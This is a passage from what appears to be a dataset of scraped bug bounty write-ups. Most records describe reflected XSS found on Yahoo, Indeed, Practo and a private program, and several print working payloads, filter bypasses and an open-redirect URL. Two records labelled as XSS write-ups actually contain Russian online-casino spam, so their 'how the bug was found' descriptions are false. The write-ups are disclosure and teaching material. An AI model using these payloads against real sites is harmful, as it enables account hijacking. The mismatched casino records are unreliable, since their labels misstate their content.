&utm_source= baz Then I tried to break out since foo, bar and baz values were also reflected in the page that but unfortunately, everything was properly encoded, https://www.private-bounty.com/Deactivate?utm_content= foo '\"><>\\ &utm_medium= bar '\"><>\\ &utm_source= baz '\"><>\\ Then I tried to add quotes in the path itself but it was also encoded well, so I moved ahead to find something else after not being able to XSS this due to the proper encoding of user input. https://www.private-bounty.com/Deactivate/ '\" ?utm_content=foo'\"><>\\&utm_medium=bar'\"><>\\&utm_source=baz'\"><>\\ I found this pattern of \"utm_content= foo &utm_medium= bar &utm_source= baz \" on every endpoint getting reflected and no other parameter will be reflected. I tried to append a custom parameter myself to see if it gets reflected, but it didn't work https://www.private-bounty.com/Deactivate?view= aaa &utm_content= foo &utm_medium= bar &utm_source= baz &test=xxxxx After that, I tried to append a parameter named utm_foobarbaz=xxxxx https://www.private-bounty.com/Deactivate?utm_content= foo &utm_medium= bar &utm_source= baz & utm_foobarbaz=xxxxx and it was reflected! into the page, so the application only reflected the parameters beginning with \"utm\" so I tried again to break the context to achieve XSS using this parameter's value but it was also encoded well :( Then the last try I did was to break the context by putting the payload in the parameter name itself https://www.private-bounty.com/Deactivate?utm_content= foo &utm_medium= bar &utm_source= baz&utm_foobarbaz'\"</>=xxxxx and boom! it worked :D, the parameter names beginning with \"utm\" were not being encoded when reflected in the page. and That's how we alert :p , https://www.private-bounty.com/Deactivate?utm_content=foo&utm_medium=bar&utm_source=baz& utm_foobarbaz');alert(1)// The lesson is that we should also always try to inject/fuzz the parameter names themselves and this was just a special case of such an XSS in parameter name beginning with a specific keyword \"utm\". - Rahul Maini Share Get link Facebook X Pinterest Email Other Apps Comments a 19 September 2017 at 07:37 Awesome :) Reply Delete Replies Reply jack sparrow 19 September 2017 at 08:40 :O awesone :) Reply Delete Replies Reply Mahender Singh 19 September 2017 at 11:52 Good Reply Delete Replies Reply aaaaaaaaaaaaaaaaaa 20 September 2017 at 08:15 awesome work! :P Reply Delete Replies Reply Unknown 21 September 2017 at 07:57 Good one mate (y) Reply Delete Replies Reply Unknown 22 September 2017 at 11:40 Gazzab Reply Delete Replies Reply Unknown 26 September 2017 at 02:02 keep it up !!! Reply Delete Replies Reply Unknown 8 November 2017 at 20:18 gazzab kiye ho maini saaab Reply Delete Replies Reply Add comment Load more... Post a Comment Popular Posts November 08, 2017 Local File Read via XSS in Dynamically Generated PDF Share Get link Facebook X Pinterest Email Other Apps 23 comments July 21, 2019 Exploiting a Tricky Blind SQL Injection inside LIMIT clause Share Get link Facebook X Pinterest Email Other Apps 3 comments Powered by Blogger Theme images by Matt Vince Rahul Maini Application Security Engineer and a Bug Bounty Hunter currently active on Bugcrowd. Interested in learning Binary Exploitation and Reverse Engineering! Follow me @iamnoooob Visit profile Archive December 2019 1 July 2019 1 July 2018 1 November 2017 1 September 2017 1 Report Abuse"}
{"source_url": "https://www.mohamedharon.com/2018/01/reflected-xss-possible-server-side.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/01/reflected-xss-possible-server-side.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://medium.com/bugbountywriteup/how-i-bypassed-practos-firewall-and-triggered-a-xss-b30164a8f1dc", "title": "How i bypassed Practo’s firewall and triggered a XSS. | by Vipin Chaudhary | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/how-i-bypassed-practos-firewall-and-triggered-a-xss-b30164a8f1dc. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow i bypassed Practo’s firewall and triggered a XSS. | by Vipin Chaudhary | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Vipin Chaudhary 2 min read · Sep 23, 2017 -- 3 Listen Share How i bypassed Practo’s firewall and triggered a XSS. One night after submitting few bug reports, i was browsing practo.com and then i thought of looking for vulnerabilities on it. After some time i came to know that they have firewall blocking all the XSS payloads so i had to try something advance, but somehow i managed to get HTML Injection on their main domain. Press enter or click to view image in full size Then i started digging deep to get a XSS, but Firewall :( then i thought of going back to brutelogic’s blog and see if it’s possible to bypass it or not. Most of the JS event handlers like onmouseover, onload, onclick was blocked by firewall but after experimenting a lot oncopy worked and triggered a XSS. Press enter or click to view image in full size The payload which worked was : <vipin oncopy = prompt(document.domain)> I reported this issue to Practo and they fixed it within few hours. It was when i just started into security research/bug bounty, it was a great learning experience for me. So guys when you are stuck in such situations just keep on digging and look out for help from other researchers and their blogs it will help for sure. I hope it was helpful for you too. Thanks for reading, Have a great day. Security Bug Bounty Xss Attack Hacking -- -- 3 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Vipin Chaudhary 441 followers · 1 following Security Researcher | Bug Bounty Hunter Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd", "title": "900$ XSS in yahoo ( Recon Wins ). Hi Guys, | by Th3G3nt3lman | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/900-xss-in-yahoo-recon-wins-65ee6d4bfcbd. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n900$ XSS in yahoo ( Recon Wins ). Hi Guys, | by Th3G3nt3lman | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication 900$ XSS in yahoo ( Recon Wins ) Th3G3nt3lman 4 min read · Sep 24, 2017 -- 6 Listen Share Hi Guys, For those who expects special bypass or xss related stuff this is not about the xss i found which was easy hit, this is about the recon i did and the help i got from Knoxss to report this vulnerability to yahoo. Generally due to my work i don't have time to hunt for bugs, but when i do i tend to focus only on yahoo as its a sea of assets and they have a great team, along with the fact that i have the proper knowledge in how their sub-domains are organized, so during my usual recon for yahoo i came across this target : http://bf1-adxdb-001.data.bf1.yahoo.com and the response was “The requested URL was not found on this server” as per the below, which is something most yahoo BB hunters see usually. Press enter or click to view image in full size running quick dirsearch on the subject target i found about.php file http://bf1-adxdb-001.data.bf1.yahoo.com/about.php and the response was surprising , there is a private instance for webpagetest ( https://www.webpagetest.org/ ) running on that server as per the below : Press enter or click to view image in full size OK, thats interesting .. Starting digging in the application to find bugs and i couldn’t, even though i found also this default nginx installation endpoint that expose most of the php endpoints in the server : http://bf1-adxdb-001.data.bf1.yahoo.com/nginx.conf so i ran dirsearch on the server again with another wordlist looking for PHP endpoints and found the vulnerable one which is : http://bf1-adxdb-001.data.bf1.yahoo.com/testdb.php and the response was : Fatal error: Call to undefined function mysqli_connect() in /home/y/share/htdocs/testdb.php on line 8 [/testdb.php/] When you reach that point you realize that you must get something out of it, i had a lot of endpoints and i was testing them all but luckily i had my knoxss plugin running for *.yahoo.com and for those who don't know knoxss its a an xss discovery service created by the xss god Brute and you can read about it here https://knoxss.me/?page_id=2 and i recommend using it due to the success i had using it. so when i was testing all endpoints knoxss triggered an xss in the subject domain and this was the final payload : Press enter or click to view image in full size Lessons learned here : 1- don't stop when you see the response forbidden/not found on the target you are testing, run dirsearch or any tool you prefer to find endpoints. 2- Recon wins : Recon in yahoo is not an easy process, planning for a separated blog to describe it, it needs focus and patience, i monitor yahoo assets in shodan.io on daily basis, also whenever i find an interesting sub-domain using aquatone/sublister i try to find other sub-domains under it, and keep going down level by level, i am the crazy guy who runs full ports scan on thousands of ip’s , why ? because that helped me reporting unique stuff, most of my bugs to yahoo were infra related due to a strange open ports , found an Access control servers, appliances, storage consoles, ..atc along with interesting web application that was never touched by other researches, as an example i found stuff in the 5th & 6th level of subdomains in yahoo like the below : target.*.*.*.yahoo.com & target.*.*.*.*.yahoo.com I do know other researchers are smart enough to report bugs in the web apps thats available publicly without doing that kind of recon i do, and they are very successful in that, but you can say i choose the hard way and i am loving it. finally This is how it looks like when you are searching for subdomains in Yahoo, ,, or lets say sub-sub-sub-sub-subdomains Press enter or click to view image in full size Best Regards :) Bug Bounty Hackerone -- -- 6 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Th3G3nt3lman 2.7K followers · 3 following Security Researcher / Bug Bounty Hunter / https://twitter.com/Th3G3nt3lman Responses ( 6 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@SyntaxError4/reflective-xss-and-open-redirect-on-indeed-com-subdomain-b4ab40e40c83", "title": "Reflective XSS and Open Redirect on Indeed.com subdomain | by Syntax Error | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@SyntaxError4/reflective-xss-and-open-redirect-on-indeed-com-subdomain-b4ab40e40c83. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflective XSS and Open Redirect on Indeed.com subdomain | by Syntax Error | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflective XSS and Open Redirect on Indeed.com subdomain Syntax Error 2 min read · Sep 4, 2017 -- Listen Share Hi Again! So here is one more writeup on a simple bug I found on Indeed.com subdomain. As always I looked up for subdomains using Sublist3r tool. While I was browsing through offfers.indeed.com subdomain ,I noticed a functionality where a user could choose some filters from dropdown and create a PDF report of the data which was generated. I quickly selected some values and generated the report.When I Opened the Report ,I noticed that the URL had an extra parameter Target which had the file location for the PDF file. http://offers.indeed.com/directcontent.html?target=http://offers.indeed.com/company/xy/xxyy.pdf On seeing Target parameter in URL, my instant thought was to test for Open redirect .So I entered Target parameter value as https://www.google.com and I noticed it was actually taking user to Google.com Vulnerable URL :http://offers.indeed.com/directcontent.html?target=http://www.google.com Next was to check if the same parameter was vulnerable to XSS as well. I gave the Target parameter value as javascript:alert(1) and as I was suspecting alert box popped up. Press enter or click to view image in full size I reported this issue to Indeed Via Bugcrowd and the bug was resolved within a week.As part of fix, they completely removed this functionality from the site. For any question,You can get in touch with me @syntaxerror Untill next time Security -- -- Written by Syntax Error 930 followers · 63 following DwWI92mUoaxZ No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@SyntaxError4/how-i-found-reflective-xss-in-yahoo-subdomain-3ad4831b386e", "title": "How I found Reflective XSS in Yahoo Subdomain | by Syntax Error | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@SyntaxError4/how-i-found-reflective-xss-in-yahoo-subdomain-3ad4831b386e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found Reflective XSS in Yahoo Subdomain | by Syntax Error | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found Reflective XSS in Yahoo Subdomain Syntax Error 3 min read · Sep 3, 2017 -- 2 Listen Share When 2017 started,I had a bounty goal of finding a bug in Yahoo but I never actually got time to look into their program. One day I planned to go for it.So here is the writeup on how I found Reflective XSS on a yahoo subdomain. This is my first writeup so please ignore any mistakes that you find. First step was to find subdomains on yahoo and the tool I used was Sublist3r ( https://github.com/aboul3la/Sublist3r ) Press enter or click to view image in full size Once I had the list,I started checking the subdomains one by one.During that time my attention went to one of the subdomains: https://hkfood.yahoo.com There was a search bar on the site to lookup for recipes and I initially tried couple of payloads to see what characters were filtered.For my luck, my inital payload itself worked and I could pop XSS Vulnerable URL : http://hkfood.yahoo.com/search_result#keywords=“/>.<<img src=x onerror=alert(1)//”&gt;>&lt;&gt;&page=1 Press enter or click to view image in full size I reported the bug to Yahoo and the bug was Resolved the very next day.I rechecked the Vulnerable URL and was not able to reproduce the issue. After 2 days,I was getting Bored and thought about retesting around the same XSS bug.This time I found that <script><img> tags were being filtered. So I started trying different combination of payloads to see if I can break the URL. To get <script> tag working,I broke it in pieces like below and added that to the old vulnerable URL and Hurray!!! Payload: <scr<script>ipt>alert(1)</scr</script>ipt> Press enter or click to view image in full size Tips: Always Retest your bugs after its marked Resolved.There is a good chance that you will find a bypass. I have seen some folks using tools/scripts to get sublist3r output in hyperlinks format.You can simply copy sublist3r output, paste it in gmail and mail it to yourself to get the output URL’s as hyperlinks. Thanks for taking time to read my blog. For any questions, you can get in touch with me at Syntaxerror Security Xss Reflectivexss Yahoo -- -- 2 Written by Syntax Error 930 followers · 63 following DwWI92mUoaxZ Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2018/03/xss-in-sportstwcampaignyahoonet.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/03/xss-in-sportstwcampaignyahoonet.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные 